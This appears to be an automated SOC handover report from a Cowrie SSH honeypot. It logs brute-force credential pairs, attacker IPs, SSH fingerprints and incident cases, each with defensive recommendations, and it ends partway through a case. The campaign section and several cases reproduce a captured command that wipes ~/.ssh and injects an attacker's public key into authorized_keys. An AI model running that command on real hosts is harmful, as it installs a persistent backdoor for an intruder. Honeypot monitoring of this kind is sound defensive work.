# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-05 |
| **Generated At** | 2026-07-05T10:20:09Z |
| **Shift Time** | 10:20 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **413** |
| Confirmed Threats | **404** |
| False Positives Filtered | **9** (2.2%) |
| Unique Attacker IPs | **44** |
| Countries of Origin | **18** |
| High Severity Cases | **99** |
| Medium Severity Cases | **1** |
| Low Severity Cases | **313** |
| Malware Samples Analyzed | **3** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **112** |
| Unique Credential Pairs | **53** |
| Unique Usernames | **12** |
| Unique Passwords | **45** |
| Successful Auth Pairs | **87** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 57 |
| `345gs5662d34` | 25 |
| `ubuntu` | 6 |
| `admin` | 4 |
| `support` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 25 |
| `3245gs5662d34` | 25 |
| `admin` | 4 |
| `support` | 4 |
| `LeitboGi0ro` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 25 |
| `root` | `3245gs5662d34` | 17 |
| `admin` | `admin` | 4 |
| `support` | `support` | 4 |
| `root` | `LeitboGi0ro` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `890317` | `165.22.1.254` | 2026-07-05T06:55:24 |
| `345gs5662d34` | `345gs5662d34` | `165.22.1.254` | 2026-07-05T06:55:26 |
| `root` | `3245gs5662d34` | `165.22.1.254` | 2026-07-05T06:55:26 |
| `education` | `education` | `91.239.206.123` | 2026-07-05T06:56:52 |
| `345gs5662d34` | `345gs5662d34` | `91.239.206.123` | 2026-07-05T06:56:55 |
| `education` | `3245gs5662d34` | `91.239.206.123` | 2026-07-05T06:56:56 |
| `root` | `Daniel123` | `77.66.192.139` | 2026-07-05T06:57:10 |
| `345gs5662d34` | `345gs5662d34` | `77.66.192.139` | 2026-07-05T06:57:13 |
| `root` | `3245gs5662d34` | `77.66.192.139` | 2026-07-05T06:57:14 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-05T07:01:22 |
| `root` | `Qq123.com` | `175.118.127.138` | 2026-07-05T07:04:14 |
| `345gs5662d34` | `345gs5662d34` | `175.118.127.138` | 2026-07-05T07:04:17 |
| `root` | `3245gs5662d34` | `175.118.127.138` | 2026-07-05T07:04:19 |
| `ubuntu` | `a1b2c3d4e5f6` | `45.198.224.120` | 2026-07-05T07:06:08 |
| `support` | `support` | `176.53.159.196` | 2026-07-05T07:08:53 |
| `root` | `qwe#@!` | `185.242.3.195` | 2026-07-05T07:09:56 |
| `support` | `support` | `10.0.0.73` | 2026-07-05T07:10:12 |
| `customer` | `asdfghjkl` | `111.19.212.140` | 2026-07-05T07:15:08 |
| `345gs5662d34` | `345gs5662d34` | `111.19.212.140` | 2026-07-05T07:15:12 |
| `customer` | `3245gs5662d34` | `111.19.212.140` | 2026-07-05T07:15:14 |
| `root` | `abcd1234#` | `111.19.212.140` | 2026-07-05T07:15:40 |
| `root` | `3245gs5662d34` | `111.19.212.140` | 2026-07-05T07:15:47 |
| `root` | `p0o9i8u7y6t5r4e3w2q1p0o9` | `111.19.212.140` | 2026-07-05T07:16:04 |
| `root` | `outlaw` | `111.19.212.140` | 2026-07-05T07:16:31 |
| `root` | `iloveyou8` | `111.19.212.140` | 2026-07-05T07:17:01 |
| `root` | `qinqin` | `111.19.212.140` | 2026-07-05T07:17:27 |
| `root` | `Password1234567890` | `45.198.224.120` | 2026-07-05T07:17:31 |
| `root` | `sports1` | `111.47.243.219` | 2026-07-05T07:17:33 |
| `345gs5662d34` | `345gs5662d34` | `111.47.243.219` | 2026-07-05T07:17:38 |
| `root` | `3245gs5662d34` | `111.47.243.219` | 2026-07-05T07:17:40 |
| `user` | `abc123!!` | `111.19.212.140` | 2026-07-05T07:17:51 |
| `user` | `3245gs5662d34` | `111.19.212.140` | 2026-07-05T07:17:57 |
| `root` | `alabala` | `111.19.212.140` | 2026-07-05T07:18:16 |
| `mauricio` | `123456` | `111.19.212.140` | 2026-07-05T07:18:38 |
| `mauricio` | `3245gs5662d34` | `111.19.212.140` | 2026-07-05T07:18:45 |
| `root` | `buddy` | `111.19.212.140` | 2026-07-05T07:19:01 |
| `ubuntu` | `p@ssword123` | `45.198.224.120` | 2026-07-05T07:29:36 |
| `root` | `qweasd!@#` | `45.198.224.120` | 2026-07-05T07:41:28 |
| `root` | `LeitboGi0ro` | `140.245.50.204` | 2026-07-05T07:44:20 |
| `root` | `123@@@` | `140.245.50.204` | 2026-07-05T07:44:20 |
| `root` | `smo@@kkklss` | `140.245.50.204` | 2026-07-05T07:44:22 |
| `root` | `qwe#@!` | `10.0.0.73` | 2026-07-05T07:50:42 |
| `root` | `qwe123QWE123` | `45.198.224.120` | 2026-07-05T07:52:43 |
| `root` | `123qweZXC` | `14.103.112.5` | 2026-07-05T07:56:53 |
| `345gs5662d34` | `345gs5662d34` | `14.103.112.5` | 2026-07-05T07:56:59 |
| `root` | `3245gs5662d34` | `14.103.112.5` | 2026-07-05T07:57:01 |
| `root` | `brayan` | `148.216.28.11` | 2026-07-05T07:58:19 |
| `345gs5662d34` | `345gs5662d34` | `148.216.28.11` | 2026-07-05T07:58:22 |
| `root` | `3245gs5662d34` | `148.216.28.11` | 2026-07-05T07:58:22 |
| `amiri` | `123456` | `186.122.177.140` | 2026-07-05T07:59:42 |
| `345gs5662d34` | `345gs5662d34` | `186.122.177.140` | 2026-07-05T07:59:45 |
| `amiri` | `3245gs5662d34` | `186.122.177.140` | 2026-07-05T07:59:46 |
| `root` | `Test123!@` | `203.25.208.110` | 2026-07-05T07:59:51 |
| `345gs5662d34` | `345gs5662d34` | `203.25.208.110` | 2026-07-05T07:59:56 |
| `root` | `3245gs5662d34` | `203.25.208.110` | 2026-07-05T07:59:59 |
| `ubuntu` | `1qaz2wsx` | `69.5.7.218` | 2026-07-05T08:00:04 |
| `345gs5662d34` | `345gs5662d34` | `69.5.7.218` | 2026-07-05T08:00:09 |
| `ubuntu` | `3245gs5662d34` | `69.5.7.218` | 2026-07-05T08:00:10 |
| `root` | `anthony12` | `95.130.227.33` | 2026-07-05T08:00:39 |
| `345gs5662d34` | `345gs5662d34` | `95.130.227.33` | 2026-07-05T08:00:43 |
| `root` | `3245gs5662d34` | `95.130.227.33` | 2026-07-05T08:00:44 |
| `root` | `server@1234` | `34.175.118.185` | 2026-07-05T08:01:33 |
| `345gs5662d34` | `345gs5662d34` | `34.175.118.185` | 2026-07-05T08:01:37 |
| `root` | `3245gs5662d34` | `34.175.118.185` | 2026-07-05T08:01:39 |
| `amiri` | `123456` | `211.46.188.16` | 2026-07-05T08:02:11 |
| `345gs5662d34` | `345gs5662d34` | `211.46.188.16` | 2026-07-05T08:02:15 |
| `amiri` | `3245gs5662d34` | `211.46.188.16` | 2026-07-05T08:02:16 |
| `root` | `qwaszx` | `45.198.224.120` | 2026-07-05T08:04:10 |
| `test` | `qwerty123` | `2.26.109.172` | 2026-07-05T08:07:58 |
| `345gs5662d34` | `345gs5662d34` | `2.26.109.172` | 2026-07-05T08:08:00 |
| `test` | `3245gs5662d34` | `2.26.109.172` | 2026-07-05T08:08:01 |
| `root` | `Password1234567` | `45.198.224.120` | 2026-07-05T08:15:40 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-05T08:24:18 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-05T08:24:18 |
| `root` | `` | `107.173.85.94` | 2026-07-05T08:24:32 |
| `root` | `LeitboGi0ro` | `107.173.85.94` | 2026-07-05T08:24:37 |
| `debian` | `f` | `10.0.0.73` | 2026-07-05T08:25:22 |
| `root` | `git123` | `45.198.224.120` | 2026-07-05T08:26:54 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-05T08:30:04 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-05T08:30:05 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-05T08:30:06 |
| `ubuntu` | `11` | `45.198.224.120` | 2026-07-05T08:38:09 |
| `root` | `qvod_123` | `185.242.3.195` | 2026-07-05T08:42:39 |
| `root` | `silly1` | `10.0.0.73` | 2026-07-05T08:45:05 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-05T08:45:08 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-05T08:45:09 |
| `ubuntu` | `123qweQWE` | `45.198.224.120` | 2026-07-05T08:49:31 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **413** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 81 |
| Go SSH scanner | 21 |
| Paramiko (Python) | 10 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 75 | 15 |
| `16443846184e...` | Generic scanner | 16 | 3 |
| `a2de0f306611...` | Mirai/variant | 10 | 3 |
| `4e066189c3bb...` | Generic scanner | 3 | 1 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 75 | 15 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 16 | 3 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 10 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 6 | 2 | — |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 24 | 15 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `165.22.1.254`, `91.239.206.123`, `203.25.208.110`, `148.216.28.11`, `69.5.7.218`, `34.175.118.185`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **44** |
| Unique ASNs | **33** |
| High-Risk ASNs | **30** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 5 | HIGH |
| `AS396982` | Google LLC | 3 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS197170` | TechTies Inc. | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS11172` | Alestra, S. de R.L. de C.V. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (100)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-acbc9bbcea47

| Field | Detail |
|---|---|
| **Source IP** | `165.22.1[.]254` |
| **First Seen** | 2026-07-05 06:55 |
| **Last Seen** | 2026-07-05 06:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:55:24` | `cowrie.session.connect` |
| `2026-07-05 06:55:24` | `cowrie.client.version` |
| `2026-07-05 06:55:24` | `cowrie.client.kex` |
| `2026-07-05 06:55:24` | `cowrie.login.success` |
| `2026-07-05 06:55:25` | `cowrie.session.params` |
| `2026-07-05 06:55:25` | `cowrie.command.input` |
| `2026-07-05 06:55:25` | `cowrie.command.failed` |
| `2026-07-05 06:55:25` | `cowrie.log.closed` |
| `2026-07-05 06:55:26` | `cowrie.session.params` |
| `2026-07-05 06:55:26` | `cowrie.command.input` |
| `2026-07-05 06:55:26` | `cowrie.session.file_download` |
| `2026-07-05 06:55:26` | `cowrie.log.closed` |
| `2026-07-05 06:55:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.1[.]254` to AbuseIPDB if not already reported
- [ ] Block `165.22.1[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f017432d02d9

| Field | Detail |
|---|---|
| **Source IP** | `165.22.1[.]254` |
| **First Seen** | 2026-07-05 06:55 |
| **Last Seen** | 2026-07-05 06:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:55:26` | `cowrie.session.connect` |
| `2026-07-05 06:55:26` | `cowrie.client.version` |
| `2026-07-05 06:55:26` | `cowrie.client.kex` |
| `2026-07-05 06:55:26` | `cowrie.login.success` |
| `2026-07-05 06:55:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.1[.]254` to AbuseIPDB if not already reported
- [ ] Block `165.22.1[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54d82948cb5d

| Field | Detail |
|---|---|
| **Source IP** | `165.22.1[.]254` |
| **First Seen** | 2026-07-05 06:55 |
| **Last Seen** | 2026-07-05 06:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:55:26` | `cowrie.session.connect` |
| `2026-07-05 06:55:26` | `cowrie.client.version` |
| `2026-07-05 06:55:26` | `cowrie.client.kex` |
| `2026-07-05 06:55:26` | `cowrie.login.success` |
| `2026-07-05 06:55:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.1[.]254` to AbuseIPDB if not already reported
- [ ] Block `165.22.1[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85646afebd75

| Field | Detail |
|---|---|
| **Source IP** | `91.239.206[.]123` |
| **First Seen** | 2026-07-05 06:56 |
| **Last Seen** | 2026-07-05 06:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:56:51` | `cowrie.session.connect` |
| `2026-07-05 06:56:51` | `cowrie.client.version` |
| `2026-07-05 06:56:52` | `cowrie.client.kex` |
| `2026-07-05 06:56:52` | `cowrie.login.success` |
| `2026-07-05 06:56:53` | `cowrie.session.params` |
| `2026-07-05 06:56:53` | `cowrie.command.input` |
| `2026-07-05 06:56:53` | `cowrie.command.failed` |
| `2026-07-05 06:56:53` | `cowrie.log.closed` |
| `2026-07-05 06:56:54` | `cowrie.session.params` |
| `2026-07-05 06:56:54` | `cowrie.command.input` |
| `2026-07-05 06:56:54` | `cowrie.session.file_download` |
| `2026-07-05 06:56:54` | `cowrie.log.closed` |
| `2026-07-05 06:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.239.206[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.239.206[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e01c88b72c93

| Field | Detail |
|---|---|
| **Source IP** | `91.239.206[.]123` |
| **First Seen** | 2026-07-05 06:56 |
| **Last Seen** | 2026-07-05 06:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:56:54` | `cowrie.session.connect` |
| `2026-07-05 06:56:54` | `cowrie.client.version` |
| `2026-07-05 06:56:55` | `cowrie.client.kex` |
| `2026-07-05 06:56:55` | `cowrie.login.success` |
| `2026-07-05 06:56:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.239.206[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.239.206[.]123` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3b62eac529d

| Field | Detail |
|---|---|
| **Source IP** | `91.239.206[.]123` |
| **First Seen** | 2026-07-05 06:56 |
| **Last Seen** | 2026-07-05 06:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:56:56` | `cowrie.session.connect` |
| `2026-07-05 06:56:56` | `cowrie.client.version` |
| `2026-07-05 06:56:56` | `cowrie.client.kex` |
| `2026-07-05 06:56:56` | `cowrie.login.success` |
| `2026-07-05 06:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.239.206[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.239.206[.]123` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49967d285415

| Field | Detail |
|---|---|
| **Source IP** | `77.66.192[.]139` |
| **First Seen** | 2026-07-05 06:57 |
| **Last Seen** | 2026-07-05 06:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:57:09` | `cowrie.session.connect` |
| `2026-07-05 06:57:09` | `cowrie.client.version` |
| `2026-07-05 06:57:09` | `cowrie.client.kex` |
| `2026-07-05 06:57:10` | `cowrie.login.success` |
| `2026-07-05 06:57:11` | `cowrie.session.params` |
| `2026-07-05 06:57:11` | `cowrie.command.input` |
| `2026-07-05 06:57:11` | `cowrie.command.failed` |
| `2026-07-05 06:57:11` | `cowrie.log.closed` |
| `2026-07-05 06:57:12` | `cowrie.session.params` |
| `2026-07-05 06:57:12` | `cowrie.command.input` |
| `2026-07-05 06:57:12` | `cowrie.session.file_download` |
| `2026-07-05 06:57:12` | `cowrie.log.closed` |
| `2026-07-05 06:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.66.192[.]139` to AbuseIPDB if not already reported
- [ ] Block `77.66.192[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38635671dc4e

| Field | Detail |
|---|---|
| **Source IP** | `77.66.192[.]139` |
| **First Seen** | 2026-07-05 06:57 |
| **Last Seen** | 2026-07-05 06:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:57:12` | `cowrie.session.connect` |
| `2026-07-05 06:57:12` | `cowrie.client.version` |
| `2026-07-05 06:57:12` | `cowrie.client.kex` |
| `2026-07-05 06:57:13` | `cowrie.login.success` |
| `2026-07-05 06:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.66.192[.]139` to AbuseIPDB if not already reported
- [ ] Block `77.66.192[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7c76e49f37d

| Field | Detail |
|---|---|
| **Source IP** | `77.66.192[.]139` |
| **First Seen** | 2026-07-05 06:57 |
| **Last Seen** | 2026-07-05 06:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:57:13` | `cowrie.session.connect` |
| `2026-07-05 06:57:13` | `cowrie.client.version` |
| `2026-07-05 06:57:13` | `cowrie.client.kex` |
| `2026-07-05 06:57:14` | `cowrie.login.success` |
| `2026-07-05 06:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.66.192[.]139` to AbuseIPDB if not already reported
- [ ] Block `77.66.192[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-021c0b339f90

| Field | Detail |
|---|---|
| **Source IP** | `175.118.127[.]138` |
| **First Seen** | 2026-07-05 07:04 |
| **Last Seen** | 2026-07-05 07:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:04:13` | `cowrie.session.connect` |
| `2026-07-05 07:04:13` | `cowrie.client.version` |
| `2026-07-05 07:04:13` | `cowrie.client.kex` |
| `2026-07-05 07:04:14` | `cowrie.login.success` |
| `2026-07-05 07:04:15` | `cowrie.session.params` |
| `2026-07-05 07:04:15` | `cowrie.command.input` |
| `2026-07-05 07:04:15` | `cowrie.command.failed` |
| `2026-07-05 07:04:15` | `cowrie.log.closed` |
| `2026-07-05 07:04:16` | `cowrie.session.params` |
| `2026-07-05 07:04:16` | `cowrie.command.input` |
| `2026-07-05 07:04:16` | `cowrie.session.file_download` |
| `2026-07-05 07:04:16` | `cowrie.log.closed` |
| `2026-07-05 07:04:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.118.127[.]138` to AbuseIPDB if not already reported
- [ ] Block `175.118.127[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-474498dc34e5

| Field | Detail |
|---|---|
| **Source IP** | `175.118.127[.]138` |
| **First Seen** | 2026-07-05 07:04 |
| **Last Seen** | 2026-07-05 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 07:04:17` | `cowrie.session.connect` |
| `2026-07-05 07:04:17` | `cowrie.client.version` |
| `2026-07-05 07:04:17` | `cowrie.client.kex` |
| `2026-07-05 07:04:17` | `cowrie.login.success` |
| `2026-07-05 07:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.118.127[.]138` to AbuseIPDB if not already reported
- [ ] Block `175.118.127[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7344e76d3eb0

| Field | Detail |
|---|---|
| **Source IP** | `175.118.127[.]138` |
| **First Seen** | 2026-07-05 07:04 |
| **Last Seen** | 2026-07-05 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
